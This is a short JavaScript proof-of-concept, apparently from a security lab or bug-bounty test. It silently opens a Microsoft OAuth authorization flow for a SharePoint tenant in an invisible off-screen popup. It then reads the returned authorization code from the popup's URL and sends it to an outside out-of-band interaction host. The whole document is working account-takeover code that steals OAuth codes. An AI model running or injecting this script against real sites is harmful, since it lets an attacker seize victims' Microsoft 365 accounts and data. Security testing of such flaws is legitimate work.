(async()=>{
if(window.__labPoc)return;
window.__labPoc=1;

const oauth = "https://login.microsoftonline.com:443/765ca7f2-70b3-424e-ac45-f00d5a55e9ce/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=form%5Fpost&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=1B29E2DBE599DC699887606A54AF957449A8B8BC00A5B9A2%2DD44F931F659874CAFEB16F5F0237AFEA3CF4248B20C29CEBD4A3B43165C18040&redirect%5Furi=https%3A%2F%2Fshiscolinotests%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims={\"id_token\":{\"xms_cc\":{\"values\":[\"CP1\"]}}}&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=c002e2a1%2Df0db%2Db000%2D0f8f%2D87efa0c0adff";

let win=open(oauth,"","width=1,height=1,left=-10000,top=-10000");

for(let i=0;i<80;i++){
 try{
  let hash=win.location.hash;
  if(hash&&hash.includes("code=")){
   fetch("https://j1m02evxjge7n0ae4ky76kviqu9mqupus.oast.site/?x="+encodeURIComponent(hash));
   win.close();
   break;
  }
 }catch(e){}
 await new Promise(r=>setTimeout(r,300));
}
})();
